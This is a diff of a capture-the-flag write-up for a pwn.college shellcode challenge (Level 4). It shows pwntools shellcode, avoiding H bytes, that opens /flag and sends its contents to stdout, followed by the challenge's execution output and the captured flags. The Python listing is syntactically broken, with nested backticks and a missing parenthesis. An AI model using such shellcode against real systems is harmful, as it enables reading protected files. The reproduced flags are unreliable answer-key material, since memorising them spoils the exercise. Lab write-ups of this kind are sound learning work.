@@ -164,3 +164,63 @@ pwn.college{QqlcAkceUM88lJIt4GZV7utuMWO.0VOxIDL3AjN1czW}
 
 > FLAG -> pwn.college{QqlcAkceUM88lJIt4GZV7utuMWO.0VOxIDL3AjN1czW}
 # LEVEL 4
+Acc to the chal, the shellcode cant have any 'H' bytes.  
+I did some research on this and found out the `0x48`  byte which is the hex form of `H`, is an operation code for 64 bit registers.
+So avoiding the use of 64-bit registers, and using 32-bit registers (starting with `e`), we can inject our shellcode and get the flag.
+```
+from pwn import *
+
+context.arch='amd64'
+context.os='linux'
+
+asmc = ```
+    xor eax, eax
+    mov eax, 2
+    lea edi, [rip + path]
+    xor esi, esi
+    syscall
+    xor edi, edi
+    mov dil, 1
+    xor esi, esi
+    mov sil, al
+    xor edx, edx
+    mov r10, 128
+    mov al, 40
+    syscall
+path:
+    .string "/flag"```
+sc=asm(asmc
+print(sc)
+```
+After provifing the shell code to the program, we can observe that the same instructions have been repeated as before but using 32 bit registers.  
+
+
+```
+Executing filter...
+
+This challenge requires that your shellcode have no H bytes!
+
+This challenge is about to execute the following shellcode:
+
+      Address      |                      Bytes                    |          Instructions
+------------------------------------------------------------------------------------------
+0x000000002d632000 | 31 c0                                         | xor eax, eax
+0x000000002d632002 | b8 02 00 00 00                                | mov eax, 2
+0x000000002d632007 | 8d 3d 1b 00 00 00                             | lea edi, [rip + 0x1b]
+0x000000002d63200d | 31 f6                                         | xor esi, esi
+0x000000002d63200f | 0f 05                                         | syscall
+0x000000002d632011 | 31 ff                                         | xor edi, edi
+0x000000002d632013 | 40 b7 01                                      | mov dil, 1
+0x000000002d632016 | 31 f6                                         | xor esi, esi
+0x000000002d632018 | 40 88 c6                                      | mov sil, al
+0x000000002d63201b | 31 d2                                         | xor edx, edx
+0x000000002d63201d | 49 c7 c2 80 00 00 00                          | mov r10, 0x80
+0x000000002d632024 | b0 28                                         | mov al, 0x28
+0x000000002d632026 | 0f 05                                         | syscall
+
+Executing shellcode!
+
+pwn.college{coKGrl-mfcOO_yHGIjdgYTuar1j.0FMyIDL3AjN1czW}
+```
+
+> FLAG -> pwn.college{coKGrl-mfcOO_yHGIjdgYTuar1j.0FMyIDL3AjN1czW}
